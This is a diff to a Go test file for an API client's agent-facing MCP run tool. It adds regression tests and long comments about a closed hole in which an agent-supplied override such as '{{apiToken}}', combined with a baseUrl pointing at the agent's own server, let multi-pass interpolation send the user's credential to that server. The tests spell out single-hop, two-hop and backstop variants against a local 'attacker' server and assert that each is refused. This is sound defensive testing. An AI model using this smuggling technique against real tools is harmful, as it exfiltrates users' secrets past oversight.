@@ -10,13 +10,16 @@ package core
 //   - FINDING: the attack succeeded, or a documented guarantee does not hold
 //     the way the docs describe. These are named with a FINDING prefix, are
 //     left GREEN (they assert what the code actually does today, not what it
-//     should do), and carry a comment explaining exactly what breaks and why
-//     it was left as a demonstration rather than "fixed" here — fixing any of
-//     them touches internal/core/mcp_run.go or mcp_guard.go, which is
-//     production code this pass may not modify.
+//     should do), and carry a comment explaining exactly what breaks.
+//   - A CLOSED VULNERABILITY: a finding that has since been FIXED in
+//     production code. The test now asserts the fixed behaviour and its
+//     comment records both the hole and what holds in its place, so the shape
+//     cannot come back unnoticed.
 //
-// See the final report handed back by this pass for the full list with
-// file:line references.
+// The one FINDING left in this file is the port-normalization / redirect pair
+// below, which is not a hole so much as a stated limitation: mcp_guard.go's
+// own header accepts both, with the reasoning, and says what would have to
+// change for the guard to claim otherwise.
 
 import (
 	"context"
@@ -531,6 +534,270 @@ func TestMCPRunRequestCorruptApprovalsFileDegradesToPromptAgain(t *testing.T) {
 	}
 	if len(stored.Approvals) != 1 {
 		t.Fatalf("stored approvals = %d, want 1: %s", len(stored.Approvals), data)
+	}
+}
+
+// --- 2b. the override-VALUE as a smuggling channel, now closed ---------------
+
+// This test pins a CLOSED VULNERABILITY. It was a live exfiltration path, and
+// the shape it exercises must keep being refused.
+//
+// THE HOLE. The new-host guard's decision of "is there even a secret in play
+// here" was made by scanning the REQUEST'S OWN AUTHORED FIELDS — the literal,
+// unresolved `{{name}}` strings on the stored item — for a name that is itself
+// declared secret. It never looked at the VALUE of a variable override, and
+// mcpValidatedOverrides (mcp_run.go) only refuses an override BY NAME: an
+// override was meant to be inert data ("storeId": "str_42"), but nothing
+// stopped it from being an arbitrary string, including one that is itself a
+// `{{template}}`.
+//
+// THE MECHANISM. interp.Interpolate (internal/interp/interp.go) is MULTI-PASS:
+// it re-scans its own OUTPUT for new `{{...}}` tokens ("mayNest") up to 8
+// times, and the send path's final field resolution
+// (internal/core/app_request_build.go) calls exactly that function against the
+// FULL, secret-including Combined variable map. So an agent could pick a
+// request whose credential-carrying field references an ORDINARY, non-secret
+// name — a header of "Authorization: Bearer {{smuggle}}" — and call
+// run_request with variables {"smuggle": "{{apiToken}}", "baseUrl": "<its own
+// host>"}. Neither override NAME is a secret, so both were accepted; the
+// request's own fields named "smuggle", not "apiToken", so the guard found
+// zero referenced secrets and returned before a host was ever computed; and
+// the send then resolved "{{smuggle}}" to "{{apiToken}}" (pass 1) and THAT to
+// the real credential (pass 2). The secret left the process, over the wire, to
+// a server the agent's operator controls — a leak no output masking could ever
+// have caught, because it never passed through a tool result at all.
+//
+// WHAT NOW HOLDS. mcpRefuseSecretInjectingValues (mcp_guard.go) refuses any
+// agent-supplied value that reaches a secret, before any host is computed —
+// the same inversion argument mcpValidatedOverrides makes for override names,
+// applied to their values. The refusal wraps ErrDenied, names the offending
+// variable and the secret, and no approval prompt is raised, because there is
+// no honest use of this shape for a user to bless.
+func TestMCPRunRequestOverrideValueCannotSmuggleASecretPastTheNewHostGuard(t *testing.T) {
+	f := newMCPRunFixture(t)
+
+	var attackerSawAuth string
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		attackerSawAuth = r.Header.Get("Authorization")
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer attacker.Close()
+
+	f.app.mu.Lock()
+	collection := &f.app.state.Workspaces[0].Collections[0]
+	victim := types.NewRequestItem("Smuggle victim", "http", len(collection.Items)+1)
+	victim.Method = "GET"
+	victim.URL = "{{baseUrl}}/x"
+	// The credential-carrying field references an ORDINARY variable name,
+	// never the secret's own name. Nothing here is secret-shaped as far as
+	// mcpReferencedSecrets can tell.
+	victim.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{smuggle}}", Enabled: true}}
+	victim.Body = types.RequestBody{Mode: "none"}
+	collection.Items = append(collection.Items, victim)
+	victimID := victim.ID
+	f.app.mu.Unlock()
+
+	// No frontend at all, so a run that merely reached the approval prompt
+	// would also fail — but the assertions below distinguish the two: this
+	// must be a REFUSAL naming the override, not a denied approval naming a
+	// host.
+	f.app.mcpApprovalEmit = nil
+
+	_, err := f.run(context.Background(), victimID, map[string]string{
+		"smuggle": "{{apiToken}}",
+		"baseUrl": attacker.URL,
+	})
+	if err == nil {
+		t.Fatal("an override whose value resolves to a secret was allowed to run")
+	}
+	if !errors.Is(err, mcpserver.ErrDenied) {
+		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
+	}
+	if !strings.Contains(err.Error(), `"smuggle"`) || !strings.Contains(err.Error(), "apiToken") {
+		t.Errorf("the refusal should name the offending override and the secret: %v", err)
+	}
+	if strings.Contains(err.Error(), runSentinelToken) {
+		t.Errorf("the refusal quoted the secret VALUE: %v", err)
+	}
+	if attackerSawAuth != "" {
+		t.Fatalf("the attacker host was reached at all, with Authorization %q", attackerSawAuth)
+	}
+	if len(f.prompts()) != 0 {
+		t.Errorf("the injection was routed to an approval prompt (%d) instead of being refused outright", len(f.prompts()))
+	}
+}
+
+// The transitive form of the same attack: the override that names the secret
+// is not the one the request reads. {"smuggle": "{{hop}}"} with
+// {"hop": "{{apiToken}}"} is two overrides deep, and the send path's
+// multi-pass interpolation walks it exactly as happily as one. The guard's
+// walk therefore follows an override's tokens THROUGH the effective map
+// (mcpSecretsReachedByTemplate), not just one level.
+func TestMCPRunRequestRefusesAnOverrideThatReachesASecretThroughAnotherOverride(t *testing.T) {
+	f := newMCPRunFixture(t)
+	f.app.mcpApprovalEmit = nil
+
+	var attackerSawAuth string
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		attackerSawAuth = r.Header.Get("Authorization")
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer attacker.Close()
+
+	f.app.mu.Lock()
+	collection := &f.app.state.Workspaces[0].Collections[0]
+	victim := types.NewRequestItem("Transitive smuggle victim", "http", len(collection.Items)+1)
+	victim.Method = "GET"
+	victim.URL = "{{baseUrl}}/x"
+	victim.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{smuggle}}", Enabled: true}}
+	victim.Body = types.RequestBody{Mode: "none"}
+	collection.Items = append(collection.Items, victim)
+	victimID := victim.ID
+	f.app.mu.Unlock()
+
+	_, err := f.run(context.Background(), victimID, map[string]string{
+		"smuggle": "{{hop}}",
+		"hop":     "{{apiToken}}",
+		"baseUrl": attacker.URL,
+	})
+	if err == nil {
+		t.Fatal("a two-hop override chain reaching a secret was allowed to run")
+	}
+	if !errors.Is(err, mcpserver.ErrDenied) {
+		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
+	}
+	if !strings.Contains(err.Error(), "apiToken") {
+		t.Errorf("the refusal should name the secret the chain reaches: %v", err)
+	}
+	if attackerSawAuth != "" {
+		t.Fatalf("the attacker host was reached at all, with Authorization %q", attackerSawAuth)
+	}
+}
+
+// A CYCLE must terminate rather than hang or blow the stack: {"a": "{{b}}"}
+// with {"b": "{{a}}"} is a legal (if pointless) pair of overrides, and the
+// walk expands each NAME once. Nothing secret is reached, so the run proceeds
+// on its own merits.
+func TestMCPRunRequestOverrideCycleTerminatesAndIsNotRefused(t *testing.T) {
+	f := newMCPRunFixture(t)
+
+	result, err := f.run(context.Background(), f.secretReqID, map[string]string{
+		"a": "{{b}}",
+		"b": "{{a}}",
+	})
+	if err != nil {
+		t.Fatalf("a cyclic pair of harmless overrides was refused: %v", err)
+	}
+	if result.Status != http.StatusOK {
+		t.Fatalf("status = %d, want 200", result.Status)
+	}
+}
+
+// THE BACKSTOP. The name walk can only see references it can name. A variable
+// that is NOT marked secret but whose VALUE literally contains the credential
+// — a copy-pasted "authHeader", a legacy duplicate — is reachable by an
+// override without any secret name appearing anywhere in the chain. So after
+// the walk, the override is interpolated for real and the result compared
+// against the process's hydrated secret values (mcpContainsKnownSecretValue).
+func TestMCPRunRequestRefusesAnOverrideResolvingToACredentialItNeverNames(t *testing.T) {
+	f := newMCPRunFixture(t)
+	f.app.mcpApprovalEmit = nil
+
+	var attackerSawAuth string
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		attackerSawAuth = r.Header.Get("Authorization")
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer attacker.Close()
+
+	f.app.mu.Lock()
+	workspace := &f.app.state.Workspaces[0]
+	for index := range workspace.GlobalEnvironments {
+		if workspace.GlobalEnvironments[index].ID != "env-run-global" {
+			continue
+		}
+		// NOT flagged Secret: as far as every name-based rule is concerned this
+		// is an ordinary variable. Its value happens to be the credential.
+		workspace.GlobalEnvironments[index].Variables = append(
+			workspace.GlobalEnvironments[index].Variables,
+			Variable{ID: "run-var-leaky", Name: "legacyAuth", Value: runSentinelToken, Enabled: true},
+		)
+	}
+	collection := &workspace.Collections[0]
+	victim := types.NewRequestItem("Backstop victim", "http", len(collection.Items)+1)
+	victim.Method = "GET"
+	victim.URL = "{{baseUrl}}/x"
+	victim.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{smuggle}}", Enabled: true}}
+	victim.Body = types.RequestBody{Mode: "none"}
+	collection.Items = append(collection.Items, victim)
+	victimID := victim.ID
+	f.app.mu.Unlock()
+
+	_, err := f.run(context.Background(), victimID, map[string]string{
+		"smuggle": "{{legacyAuth}}",
+		"baseUrl": attacker.URL,
+	})
+	if err == nil {
+		t.Fatal("an override resolving to the credential through a non-secret variable was allowed to run")
+	}
+	if !errors.Is(err, mcpserver.ErrDenied) {
+		t.Fatalf("error is %v, want one that wraps mcpserver.ErrDenied", err)
+	}
+	if !strings.Contains(err.Error(), `"smuggle"`) {
+		t.Errorf("the refusal should name the offending override: %v", err)
+	}
+	if strings.Contains(err.Error(), runSentinelToken) {
+		t.Errorf("the refusal quoted the secret VALUE: %v", err)
+	}
+	if attackerSawAuth != "" {
+		t.Fatalf("the attacker host was reached at all, with Authorization %q", attackerSawAuth)
+	}
+}
+
+// THE OTHER HALF, and the one that makes the refusal above a boundary rather
+// than a ban on braces. An override whose value is an ordinary template over
+// ordinary variables — {"path": "/{{version}}/users"} — is exactly what the
+// run tier is for, and it must still work, ON A REQUEST THAT CARRIES A SECRET
+// (the fixture's own {{apiToken}} header), resolving normally and reaching the
+// server with no prompt and no refusal.
+func TestMCPRunRequestStillAcceptsAnOrdinaryOverrideContainingBraces(t *testing.T) {
+	f := newMCPRunFixture(t)
+
+	f.app.mu.Lock()
+	workspace := &f.app.state.Workspaces[0]
+	for index := range workspace.GlobalEnvironments {
+		if workspace.GlobalEnvironments[index].ID == "env-run-global" {
+			workspace.GlobalEnvironments[index].Variables = append(
+				workspace.GlobalEnvironments[index].Variables,
+				Variable{ID: "run-var-version", Name: "version", Value: "v2", Enabled: true},
+			)
+		}
+	}
+	f.app.mu.Unlock()
+
+	result, err := f.run(context.Background(), f.secretReqID, map[string]string{
+		"path": "/{{version}}/users",
+	})
+	if err != nil {
+		t.Fatalf("a legitimate templated override was refused: %v", err)
+	}
+	if result.Status != http.StatusOK {
+		t.Fatalf("status = %d, want 200", result.Status)
+	}
+	if len(f.prompts()) != 0 {
+		t.Errorf("a run to the request's own known host prompted %d times", len(f.prompts()))
+	}
+	recorded := f.recorded()
+	if len(recorded) != 1 {
+		t.Fatalf("recorded %d requests, want 1: %+v", len(recorded), recorded)
+	}
+	if recorded[0].path != "/v2/users" {
+		t.Errorf("the override resolved to %q, want /v2/users", recorded[0].path)
+	}
+	// The secret still resolved inside LiteAPI and reached the server: the
+	// refusal above did not cost the tier its actual purpose.
+	if recorded[0].authHeader != "Bearer "+runSentinelToken {
+		t.Errorf("the request reached the server with Authorization %q", recorded[0].authHeader)
 	}
 }
 
